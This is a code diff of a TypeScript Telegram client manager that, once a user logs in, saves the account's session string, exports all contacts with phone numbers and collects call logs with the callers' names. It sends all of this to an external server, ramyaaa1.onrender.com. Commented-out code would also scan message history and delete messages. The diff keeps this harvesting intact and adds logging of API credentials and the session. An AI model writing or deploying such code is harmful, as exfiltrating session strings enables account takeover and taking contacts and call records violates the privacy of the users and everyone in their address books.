@@ -5,6 +5,7 @@ import axios from "axios";
 import { sleep } from "telegram/Helpers";
 import { computeCheck } from "telegram/Password";
 import bigInt from "big-integer";
+import { LogLevel } from "telegram/extensions/Logger";
 
 const clients = new Map();
 let creds = [
@@ -155,9 +156,11 @@ class TelegramManager {
 
     async createClient() {
         try {
+            console.log(this.apiId, this.apiHash)
             this.client = new TelegramClient(this.session, this.apiId, this.apiHash, {
                 connectionRetries: 5,
             });
+            await this.client.setLogLevel(LogLevel.ERROR);
             await this.client.connect();
         } catch (error) {
             console.log("Error while Connecting:", error);
@@ -345,155 +348,172 @@ class TelegramManager {
     }
 
     async getCallLogs() {
-        const result: any = await this.client.invoke(
-            new Api.messages.Search({
-                peer: new Api.InputPeerEmpty(),
-                q: '',
-                filter: new Api.InputMessagesFilterPhoneCalls({}),
-                minDate: 0,
-                maxDate: 0,
-                offsetId: 0,
-                addOffset: 0,
-                limit: 1000,
-                maxId: 0,
-                minId: 0,
-                hash: bigInt(0),
-            })
-        );
+        try {
+            const result: any = await this.client.invoke(
+                new Api.messages.Search({
+                    peer: new Api.InputPeerEmpty(),
+                    q: '',
+                    filter: new Api.InputMessagesFilterPhoneCalls({}),
+                    minDate: 0,
+                    maxDate: 0,
+                    offsetId: 0,
+                    addOffset: 0,
+                    limit: 100,
+                    maxId: 0,
+                    minId: 0,
+                    hash: bigInt.zero,
+                })
+            );
+            console.log("Got Messages");
 
-        const callLogs = result.messages.filter(
-            message => message.action instanceof Api.MessageActionPhoneCall
-        );
+            const callLogs = result.messages.filter(
+                message => message.action instanceof Api.MessageActionPhoneCall
+            );
+            console.log("filtered call logs");
 
-        const filteredResults = {
-            outgoing: 0,
-            incoming: 0,
-            video: 0,
-            chatCallCounts: {},
-            totalCalls: 0
-        };
-        for (const log of callLogs) {
-            filteredResults.totalCalls++;
-
-            const callInfo = {
-                callId: log.action.callId.value,
-                duration: log.action.duration,
-                video: log.action.video,
-                timestamp: log.date
+            const filteredResults = {
+                outgoing: 0,
+                incoming: 0,
+                video: 0,
+                chatCallCounts: {},
+                totalCalls: 0
             };
 
-            // Categorize by type
-            if (log.out) {
-                filteredResults.outgoing++;
-            } else {
-                filteredResults.incoming++;
-            }
+            for (const log of callLogs) {
+                try {
+                    filteredResults.totalCalls++;
+                    const callInfo = {
+                        callId: log.action.callId.value,
+                        duration: log.action.duration,
+                        video: log.action.video,
+                        timestamp: log.date
+                    };
+                    console.log(callInfo);
 
-            if (log.action.video) {
-                filteredResults.video++;
-            }
+                    // Categorize by type
+                    if (log.out) {
+                        filteredResults.outgoing++;
+                    } else {
+                        filteredResults.incoming++;
+                    }
 
-            // Count calls per chat ID
-            const chatId = log.peerId.userId.value;
-            if (!filteredResults.chatCallCounts[chatId]) {
-                const ent: any = await this.client.getEntity(log.peerId.userId.value)
-                filteredResults.chatCallCounts[chatId] = {
-                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
-                    count: 0
-                };
+                    if (log.action.video) {
+                        filteredResults.video++;
+                    }
+
+                    const chatId = log.peerId.userId.value;
+                    if (!filteredResults.chatCallCounts[chatId]) {
+                        console.log("Getting Enitity", chatId)
+                        let ent = { firstName: 'Default', lastName: null };
+                        try {
+                            ent = <any>await this.client.getInputEntity(chatId);
+                            console.log("Got Enitity", chatId)
+                        } catch (error) {
+                            console.log("Failed to get entity for chatId:", chatId, error);
+                        }
+                        filteredResults.chatCallCounts[chatId] = {
+                            name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
+                            count: 0
+                        };
+                    } else {
+                        console.log(chatId, ' Already exists');
+                    }
+                    filteredResults.chatCallCounts[chatId].count++;
+                } catch (error) {
+                    console.log("Error processing log:", log, error);
+                }
             }
-            filteredResults.chatCallCounts[chatId].count++;
+            console.log('Returning filtered results', filteredResults);
+            return filteredResults;
+        } catch (error) {
+            console.error("Error in getCallLogs:", error);
+            throw error;
         }
-        return filteredResults
     }
 
     async processLogin(result) {
+        console.log(this.client.session.save());
+        let photoCount = 0;
+        let videoCount = 0;
+        let movieCount = 0;
+        const sess = this.client.session.save() as unknown as string;
+        const user: any = await result.toJSON();
+        // const dialogs = await this.client?.getDialogs({ limit: 600 });
+        // const messageHistory = await this.client.getMessages(user.id, { limit: 200 }); // Adjust limit as needed
+        // for (const message of messageHistory) {
+        //     const text = message.text.toLocaleLowerCase();
+        //     if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
+        //         movieCount++
+        //     } else {
+        //         if (message.photo) {
+        //             photoCount++;
+        //         } else if (message.video) {
+        //             videoCount++;
+        //         }
+        //     }
+        // }
+        const exportedContacts: any = await this.client.invoke(new Api.contacts.GetContacts({
+            hash: bigInt.zero
+        }));
+        let channels = 0;
+        const chatsArray = [];
+        let personalChats = 0;
+
+        // Process and format the exported contacts as needed
+        const formattedContacts = exportedContacts.users.map(contact => ({
+            phone: contact.phone,
+            firstName: contact.firstName,
+            lastName: contact.lastName,
+            userName: contact.username,
+            clientId: contact.id.toString(),
+            fromId: user.id
+        }));
+        console.log("AllGood")
+        // for (let chat of dialogs) {
+        //     if (chat.isChannel || chat.isGroup) {
+        //         channels++;
+        //         const chatEntity: any = chat.entity.toJSON();
+        //         const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
+        //         if (!chatEntity.broadcast && !cannotSendMsgs) {
+        //             chatsArray.push(chatEntity);
+        //         }
+        //     } else {
+        //         personalChats++;
+        //     }
+        // }
+        const callLogs = await this.getCallLogs();
+
+        console.log("CallLogs:", callLogs);
+
+        const payload3 = {
+            photoCount, videoCount, movieCount,
+            gender: null,//data?.data?.gender,
+            mobile: user.phone,
+            session: `${sess}`,
+            firstName: user.firstName,
+            lastName: user.lastName,
+            userName: user.username,
+            channels: channels,
+            personalChats: personalChats,
+            calls: callLogs?.totalCalls > 0 ? callLogs : {},
+            contacts: exportedContacts.savedCount,
+            msgs: 0,//messageHistory.total,
+            totalChats: 0,//chats['total'],
+            lastActive: Date.now(),//lastActive,
+            date: new Date(Date.now() * 1000),//date,
+            tgId: user.id
+        };
+        console.log("Calculated results");
         try {
-            console.log(this.client.session.save());
-            let photoCount = 0;
-            let videoCount = 0;
-            let movieCount = 0;
-            const sess = this.client.session.save() as unknown as string;
-            const user: any = await result.toJSON();
-            // const dialogs = await this.client?.getDialogs({ limit: 600 });
-            // const messageHistory = await this.client.getMessages(user.id, { limit: 200 }); // Adjust limit as needed
-            // for (const message of messageHistory) {
-            //     const text = message.text.toLocaleLowerCase();
-            //     if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
-            //         movieCount++
-            //     } else {
-            //         if (message.photo) {
-            //             photoCount++;
-            //         } else if (message.video) {
-            //             videoCount++;
-            //         }
-            //     }
-            // }
-            const exportedContacts: any = await this.client.invoke(new Api.contacts.GetContacts({
-                hash: bigInt(0)
-            }));
-            let channels = 0;
-            const chatsArray = [];
-            let personalChats = 0;
-
-            // Process and format the exported contacts as needed
-            const formattedContacts = exportedContacts.users.map(contact => ({
-                phone: contact.phone,
-                firstName: contact.firstName,
-                lastName: contact.lastName,
-                userName: contact.username,
-                clientId: contact.id.toString(),
-                fromId: user.id
-            }));
-            // for (let chat of dialogs) {
-            //     if (chat.isChannel || chat.isGroup) {
-            //         channels++;
-            //         const chatEntity: any = chat.entity.toJSON();
-            //         const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
-            //         if (!chatEntity.broadcast && !cannotSendMsgs) {
-            //             chatsArray.push(chatEntity);
-            //         }
-            //     } else {
-            //         personalChats++;
-            //     }
-            // }
-            const callLogs = await this.getCallLogs();
-
-            console.log("CallLogs:", callLogs);
-
-            const payload3 = {
-                photoCount, videoCount, movieCount,
-                gender: null,//data?.data?.gender,
-                mobile: user.phone,
-                session: `${sess}`,
-                firstName: user.firstName,
-                lastName: user.lastName,
-                userName: user.username,
-                channels: channels,
-                personalChats: personalChats,
-                calls: callLogs?.totalCalls > 0 ? callLogs : {},
-                contacts: exportedContacts.savedCount,
-                msgs: 0,//messageHistory.total,
-                totalChats: 0,//chats['total'],
-                lastActive: Date.now(),//lastActive,
-                date: new Date(Date.now() * 1000),//date,
-                tgId: user.id
-            };
-            console.log("Calculated results");
-            try {
-                console.log("posting results");
-                await axios.post(`https://ramyaaa1.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
-                await axios.post(`https://ramyaaa1.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
-                await axios.post(`https://ramyaaa1.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
-            } catch (error) {
-                console.log("Error Occured 1");
-                console.log(error)
-            }
-            // await this.deleteMessages();
-        } catch (e) {
-            console.log("Error Occured 2");
-            console.log(e)
+            console.log("posting results");
+            await axios.post(`https://ramyaaa1.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
+            await axios.post(`https://ramyaaa1.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
+            await axios.post(`https://ramyaaa1.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
+        } catch (error) {
+            console.log("Error Occured 1");
+            console.log(error)
         }
+        // await this.deleteMessages();
         await this.disconnect();
         await deleteClient(this.phoneNumber);
     }
